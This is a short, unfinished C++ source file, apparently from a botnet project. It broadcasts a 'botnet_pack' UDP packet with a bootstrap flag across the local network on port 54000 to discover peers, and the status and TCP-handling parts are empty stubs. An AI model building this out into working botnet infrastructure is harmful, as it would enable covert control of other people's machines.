#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "NetworkTree.h"
#include "network.h"

void NetworkTree::send_broadcast_msg(const SOCKET& udp_sock)
{
	//TODO - multiple networks
	ULONG32 host, netmask;

	char buf[sizeof(struct botnet_pack)];
	struct botnet_pack* p = (struct botnet_pack*)buf;
	struct sockaddr_in addr;
	
	memset(buf, 0, sizeof(buf));
	memset(&addr, 0, sizeof(addr));

	//Calculating Broadcast IP
	host = InterfaceList[1].iiAddress.AddressIn.sin_addr.S_un.S_addr;
	netmask = InterfaceList[1].iiNetmask.AddressIn.sin_addr.S_un.S_addr;
	
	addr.sin_family = AF_INET;
	addr.sin_port = htons(54000);
	addr.sin_addr.S_un.S_addr = ~((netmask | host) ^ host);
	
	// Adding data to the packet
	p->boot_strap = 1;	
	
	sendto(udp_sock, buf, sizeof(buf), 0, (struct sockaddr*)&addr, sizeof(addr));
}

void NetworkTree::get_network_status(const SOCKET& tcp_sock, const SOCKET& udp_sock)
{
	
}

NetworkTree::NetworkTree(
	const SOCKET& udp_sock,
	const SOCKET& tcp_sock
)
{
	ip_addr = 0; //This PC 
	
	//Send a broadcast msg to the lan (UDP).
	send_broadcast_msg(udp_sock);


	//Manage incoming connections (TCP).
	
}

